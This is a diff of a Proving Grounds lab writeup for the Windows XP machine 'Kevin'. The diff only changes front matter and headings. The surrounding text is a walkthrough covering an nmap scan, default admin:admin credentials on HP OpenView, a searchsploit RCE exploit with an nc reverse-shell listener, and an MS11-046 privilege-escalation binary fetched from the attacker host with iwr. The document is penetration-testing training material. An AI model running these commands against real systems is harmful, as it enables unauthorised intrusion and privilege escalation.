@@ -1,8 +1,15 @@
+---
+title: "Kevin"
+difficulty: easy
+os: windows
+description: "Kevin — Offensive Security Proving Grounds easy windows writeup."
+---
+
 # Kevin
 
 > HP OpenView / MS11-046
 
-### Enumerating Services
+## Enumerating Services
 First, we'll perform a generic scan to identify the open ports and services running on this machine.
 ```shell
 # TCP
@@ -19,7 +26,7 @@ PORT      STATE SERVICE            VERSION
 3389/tcp  open  ms-wbt-server      Microsoft Terminal Services
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-### Enumerating port 80
+## Enumerating port 80
 HP Network Node Manager running. Default credentials admin:admin worked.
 ```shell
 # Search Exploit
@@ -28,7 +35,7 @@ HP OpenView Network Node Manager 7.53 - Remote Code Execution  | windows/remote/
 
 searchsploit -m 10536
 ```
-### Initial Access
+## Initial Access
 ```shell
 # Listener
 rlwrap -cAra nc -vnlp 443
@@ -39,7 +46,7 @@ python2 10536.py 192.168.182.45 80 192.168.45.242 443
 # Evidence
 type C:\Documents and Settings\Administrator\Desktop\local.txt
 ```
-### Privilege Escalation
+## Privilege Escalation
 The machine is running Windows XP SP3, vulnerable to MS11-046.
 ```shell
 # MS11-046
@@ -53,7 +60,7 @@ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
 iwr -uri http://192.168.45.242/40564.exe -outfile 40564.exe
 .\40564.exe
 ```
-### Post-Exploitation
+## Post-Exploitation
 ```shell
 # Evidence
 ipconfig
